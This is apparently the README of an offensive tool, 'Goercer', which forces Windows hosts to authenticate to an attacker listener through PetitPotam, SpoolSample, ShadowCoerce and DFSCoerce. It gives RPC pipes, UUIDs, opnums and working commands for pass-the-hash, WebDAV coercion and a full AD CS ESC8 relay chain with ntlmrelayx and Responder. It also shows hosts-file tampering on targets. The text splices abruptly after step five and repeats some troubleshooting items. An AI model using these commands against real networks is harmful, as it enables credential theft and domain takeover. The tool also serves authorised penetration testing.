![Goercer Logo](goercer.jpeg)

# Goercer

NTLM coercion tool using authenticated DCERPC with PKT_PRIVACY (encryption + signing).

## How It Works

1. Authenticates to target via SMB using NTLM (password or pass-the-hash)
2. Opens named pipe and binds to RPC interface with PKT_PRIVACY
3. Calls RPC functions with attacker-controlled UNC path parameter
4. Target attempts to access UNC path, authenticating to attacker's listener
5. Attacker captures machine account NTLMv2 hash

## Techniques

### PetitPotam (MS-EFSRPC)

| Property | Value |
|----------|-------|
| Pipe | `\pipe\efsrpc` (native) or `\pipe\lsarpc`, `\pipe\samr`, `\pipe\netlogon`, `\pipe\lsass` (legacy) |
| UUID | `df1941c5-fe89-4e79-bf10-463657acf44d` (efsrpc) |
| UUID | `c681d488-d850-11d0-8c52-00c04fd90f7e` (legacy pipes) |
| Opnums | 0 (EfsRpcOpenFileRaw), 4 (EfsRpcEncryptFileSrv), 5 (EfsRpcDecryptFileSrv), 6 (EfsRpcQueryUsersOnFile), 7 (EfsRpcQueryRecoveryAgents), 12 (EfsRpcFileKeyInfo) |
| Parameter | UNC path in `FileName` |

### SpoolSample (MS-RPRN)

| Property | Value |
|----------|-------|
| Pipe | `\pipe\spoolss` |
| UUID | `12345678-1234-abcd-ef00-0123456789ab` |
| Opnums | 1 (RpcOpenPrinter), 62 (RpcRemoteFindFirstPrinterChangeNotification), 65 (RpcRemoteFindFirstPrinterChangeNotificationEx) |
| Parameter | UNC path in `pszLocalMachine` |
| Requirement | Print Spooler service running |

### ShadowCoerce (MS-FSRVP)

| Property | Value |
|----------|-------|
| Pipe | `\pipe\FssagentRpc` |
| UUID | `a8e0653c-2744-4389-a61d-7373df8b2292` |
| Opnums | 8 (IsPathSupported), 9 (IsPathShadowed) |
| Parameter | UNC path in `ShareName` |
| Requirement | VSS configured for RPC access |

### DFSCoerce (MS-DFSNM)

| Property | Value |
|----------|-------|
| Pipe | `\pipe\netdfs` |
| UUID | `4fc742e0-4a10-11cf-8273-00aa004ae673` |
| Opnums | 12 (NetrDfsAddStdRoot), 13 (NetrDfsRemoveStdRoot) |
| Parameter | UNC path in `ServerName` |
| Requirement | DFS Namespaces role installed |

## Usage

```bash
# Default (PetitPotam with efsrpc pipe)
./goercer -t <target> -l <listener> -u <user> -d <domain>

# Pass-the-hash
./goercer -t <target> -l <listener> -u <user> -H <ntlm_hash> -d <domain>

# SpoolSample method
./goercer -t <target> -l <listener> -u <user> -d <domain> -m spoolsample

# Legacy pipe
./goercer -t <target> -l <listener> -u <user> -d <domain> --pipe lsarpc

# Specific opnum
./goercer -t <target> -l <listener> -u <user> -d <domain> --opnum 4

# Through SOCKS5 proxy
./goercer -t <target> -l <listener> -u <user> -d <domain> --proxy socks5://127.0.0.1:1080

# HTTP relay mode (for AD CS ESC8, Exchange relay, etc.)
# Requires WebClient service running on target (uses WebDAV \\SERVER@PORT\path format)
./goercer -t <target> -l <listener-ip> -u <user> -d <domain> --http
```

## HTTP/WebDAV Coercion (Port 80)

The `--http` flag enables HTTP/WebDAV coercion for relay attacks like AD CS ESC8. This triggers authentication over HTTP (port 80) instead of SMB (port 445).

### How It Works

When using `--http`, goercer sends WebDAV-formatted paths like `\\10.1.1.99@80/test\test\Settings.ini`:
- The `@80` tells Windows to use WebDAV/HTTP protocol
- The `/test` path (forward slash) triggers WebClient service
- The `\test\Settings.ini` (backslashes) completes the file path
- Target machine makes HTTP request to listener on port 80

### Critical Setup Requirements

**1. WebClient Service Must Be Running on Target**
```powershell
# Check if WebClient is running
sc query webclient

# Start WebClient (requires admin on target)
sc start webclient
```

**⚠️ CRITICAL: WebClient Requires Hostname, Not IP Address!**

Windows WebClient service has a critical limitation: **it only activates for hostnames, NOT for IP addresses**. This means:

- ❌ **Will NOT work**: `./goercer -l 10.1.1.99 --http` (IP address)
- ✅ **Will work**: `./goercer -l attacker.domain.local --http` (hostname)
- ✅ **Will work**: `./goercer -l attacker --http` (NetBIOS name)

**Why this matters:**

WebClient is designed for accessing web folders and SharePoint. It only triggers when Windows detects a "web path" - which requires DNS resolution. IP addresses bypass this detection, so WebClient never activates and Windows falls back to SMB (port 445) instead of HTTP (port 80).

**Solutions:**

1. **Best: Use a hostname that resolves to your listener**
   ```bash
   # Add DNS entry or edit target's hosts file
   # Then use hostname
   ./goercer -t dc.domain.local -l attacker.domain.local -u admin -d domain.local --http
   ```

2. **Alternative: Use NetBIOS name (single-label hostname)**
   ```bash
   # If your listener's NetBIOS name is "ATTACKER"
   ./goercer -t dc.domain.local -l ATTACKER -u admin -d domain.local --http
   ```

3. **Workaround: Modify target's hosts file** (requires prior access)
   ```powershell
   # On target (as admin)
   echo "10.1.1.99 attacker.domain.local" >> C:\Windows\System32\drivers\etc\hosts
   ```

**2. Block SMB on Your Listener Machine**

Even with a hostname, Windows tries SMB first by default. You MUST block port 445 to force HTTP fallback:

```bash
# Block SMB ports on your listener
sudo iptables -A INPUT -p tcp --dport 445 -j DROP
sudo iptables -A INPUT -p tcp --dport 139 -j DROP

# Verify SMB is blocked
sudo iptables -L INPUT -n | grep 445
```

**3. Run Responder with WebDAV Enabled**

The `-w` flag is critical - without it, Responder won't respond to WebDAV requests:

```bash
# Correct - with WebDAV support
sudo responder -I eth0 -wv

# Or use ntlmrelayx for relay attacks
sudo ntlmrelayx.py -t ldaps://dc.domain.com --http-port 80 -smb2support
```

### Usage Examples

**Basic HTTP coercion (with hostname):**
```bash
# CORRECT - using hostname
./goercer -t 192.168.1.10 -l attacker.domain.local -u admin -d domain.local --http

# WRONG - IP address won't trigger WebClient
./goercer -t 192.168.1.10 -l 10.1.1.99 -u admin -d domain.local --http
```

**Custom WebDAV path:**
```bash
# You can specify custom path format (hostname still required!)
./goercer -t 192.168.1.10 -l attacker.domain.local@80/share -u admin -d domain.local --http
```

**ESC8 attack flow:**
```bash
# 1. Ensure your listener has a resolvable hostname
# Option A: Add DNS A record for attacker.domain.local → 10.1.1.99
# Option B: Use your existing hostname

# 2. Block SMB on attacker machine
sudo iptables -A INPUT -p tcp --dport 445 -j DROP

# 3. Start ntlmrelayx targeting ADCS
sudo ntlmrelayx.py -t http://ca.domain.local/certsrv/certfnsh.asp \
    -smb2support --adcs --template DomainController

# 4. Trigger HTTP coercion from domain controller (use hostname!)
./goercer -t dc.domain.local -l attacker.domain.local -u admin -d domain.local --http

# 5.Cause 1**: Using IP address instead of hostname
  - **Solution**: Use a resolvable hostname: `-l attacker.domain.local` instead of `-l 10.1.1.99`
  - WebClient ONLY works with hostnames, not IP addresses
  
- **Cause 2**: Port 445 is still open on your listener
  - **Solution**: Block it with iptables (see above)
  - Windows prioritizes SMB over HTTP. HTTP only triggers when SMB explicitly fails.

**Problem: No callbacks at all**

- Check WebClient service is running on target: `sc query webclient`
- Verify you're using a **hostname** not an IP address for `-l` flag
- Verify Responder is using `-w` flag for WebDAV support
- Ensure firewall allows inbound port 80 on listener
- Verify your hostname resolves correctly from the target
- Try verbose mode to see exact paths: `./goercer ... --http -v`

**Problem: WebClient service won't start on target**

- WebClient may be disabled by Group Policy
- Try different coercion method: SpoolSample often works better for HTTP than PetitPotam
- Some Windows versions/patches restrict WebClient activation

**Problem: "Invalid listener IP address" error**

- For HTTP mode, you MUST use a hostname, not an IP
- Ensure your DNS/hostname is properly configured
- Use NetBIOS name as fallback (single-label hostname)
- Ensure firewall allows inbound port 80 on listener
- Try verbose mode to see exact paths: `./goercer ... --http -v`

**Problem: WebClient service won't start on target**

- WebClient may be disabled by Group Policy
- Try different coercion method: SpoolSample often works better for HTTP than PetitPotam
- Some Windows versions/patches restrict WebClient activation

### Supported Methods

All coercion methods support `--http` mode:

| Method | HTTP Support | Notes |
|--------|--------------|-------|
| PetitPotam | ✅ | Works on most Windows versions |
| SpoolSample | ✅ | Often better HTTP success rate |
| ShadowCoerce | ✅ | Requires VSS configured |
| DFSCoerce | ✅ | Requires DFS role |

### WebDAV Path Format

goercer automatically constructs the proper WebDAV path format:

```
Input:  -l 10.1.1.99 --http
Output: \\10.1.1.99@80/test\test\Settings.ini

Breakdown:
\\           - UNC path prefix
10.1.1.99    - Listener IP
@80          - Port 80 indicator (triggers WebDAV)
/test        - Forward slash path (WebDAV format)
\test\Settings.ini - Backslash file path (Windows format)
```

This mixed forward/backslash format is proven to work reliably across Windows versions.

## Flags

| Flag | Description |
|------|-------------|
| `-t, --target` | Target IP address |
| `-l, --listener` | Listener IP for callback |
| `-u, --user` | Domain username |
| `-d, --domain` | Domain name |
| `-p, --password` | Password (prompts if omitted) |
| `-H, --hash` | NTLM hash (32 hex chars) |
| `-m, --method` | Method: `petitpotam`, `spoolsample`, `shadowcoerce`, `dfscoerce` |
| `--pipe` | Named pipe: `efsrpc`, `lsarpc`, `samr`, `netlogon`, `lsass` |
| `--opnum` | Specific opnum to test |
| `--proxy` | SOCKS5 proxy URL |
| `--http` | Use HTTP URL instead of UNC for relay (e.g., AD CS ESC8) |
| `-v, --verbose` | Debug output |

## Install

```bash
git clone https://github.com/ineffectivecoder/goercer.git
cd goercer
./build.sh
```
